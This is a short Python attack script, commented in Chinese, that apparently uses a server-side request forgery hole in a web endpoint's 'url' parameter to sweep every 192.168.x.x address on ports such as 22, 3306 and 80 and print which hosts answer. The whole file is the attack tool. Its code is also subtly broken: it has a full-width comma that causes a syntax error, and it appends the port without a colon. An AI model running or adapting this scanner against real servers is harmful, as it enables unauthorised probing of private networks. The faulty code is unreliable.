import requests


def generateIP():
    ip_list = []

    for i in range(256):
        ip_2 = '192.168'
        ip_3 = ip_2 + '.' + str(i)
        for j in range(256):
            ip_4 = ip_3 + '.' + str(j)
            ip_list.append(ip_4)

    return ip_list


def run():
    url = 'http://192.158.2.244/?url='
    ip_list = generateIP()
    ports = [80, 3306, 21, 22, 23]

    for ip in ip_list:
        url_ip = url + ip
        for port in ports:
            url_ip_port = url_ip + str(port)
            response = requests.get(url_ip_port， timeout=1)
            # 判断是否能够通过ssrf判断内网存活主机
            # 目前不知道返回的是什么样子，所以通过判断状态是否为200进行模拟，具体情况具体分析
            # if response.status_code == 200:
            #     print(ip, ':', port, 'is open')
            #
            # 或者直接通过判断是否有回显判断
            if len(response.text.encode('utf-8')) > 0:
                print(ip, ':', port, 'is open')


if __name__ == '__main__':
    run()
    # ip_list = generateIP()
    # print(ip_list)
